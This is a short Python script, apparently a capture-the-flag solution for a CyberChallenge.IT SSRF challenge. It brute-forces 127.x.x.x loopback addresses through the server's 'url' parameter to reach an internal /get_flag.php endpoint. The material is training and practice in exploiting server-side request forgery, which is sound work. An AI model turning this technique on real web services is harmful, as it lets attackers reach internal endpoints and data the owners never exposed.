#!/usr/bin/env python3
import requests as r

url = 'http://ssrf2.challs.cyberchallenge.it/'

# The server is running on localhost, so we can use the loopback address
# to access the server's local file /get_flag.php

while True:
    # brute force loopback address
    for i in range(256):
        for j in range(256):
            for k in range(256):
                loopback = f'127.{i}.{j}.{k}'
                print(f'Trying {loopback}')
                response = r.get(
                    url, params={'url': f'http://{loopback}/get_flag.php'})
                if 'CCIT{' in response.text or 'flag{' in response.text:
                    print(response.text)
                    exit()
